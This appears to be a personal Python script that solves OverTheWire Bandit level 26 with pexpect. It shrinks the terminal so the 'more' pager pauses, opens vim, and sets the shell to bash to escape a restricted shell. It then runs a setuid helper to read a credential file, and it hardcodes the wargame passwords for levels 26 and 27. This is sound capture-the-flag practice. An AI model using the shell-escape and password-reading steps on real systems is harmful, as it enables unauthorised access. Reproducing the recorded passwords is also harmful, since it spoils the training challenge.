# #!/bin/bash


# imp stuff ::
# child.sendline("./bandit27-do cat /etc/bandit_pass/bandit27")

# Level Goal
# Good job getting a shell! Now hurry and grab the password for bandit27

#!/usr/bin/env python3
import time
import pexpect # pyright: ignore[reportMissingModuleSource]

host = "bandit.labs.overthewire.org"
port = 2220
user = "bandit26"
password = "s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ"

ssh_cmd = f"ssh -o StrictHostKeyChecking=no -p {port} {user}@{host}"
child = pexpect.spawn(ssh_cmd, encoding="utf-8")

# Force tiny terminal so 'more' always paginates
child.setwinsize(5, 20)

# Handle password
child.expect("password:")
child.sendline(password)

# Wait for 'more' screen
child.expect(["--More--", ":"])
child.send("v")   # go into vim

# Give vim time to start
time.sleep(1)

# Send vim commands to break out into bash
child.sendline(":set shell=/bin/bash")
child.sendline(":shell")
child.sendline("Password of bandit 27 is : ")

child.sendline("./bandit27-do cat /etc/bandit_pass/bandit27")

print("\n inside a real bash shell as bandit26 no way : \n")

# child.sendline("c")
#  i don't want control just paste bandit 27 password and exit the ssh s
child.interact() # this gives me back control    # very crucial line if this don't work nothing works
child.close(force=True)# close don't work here

# password of bandit 27  is : upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB

# it worked no way !!!!!!!!! but not the way i intend it i give up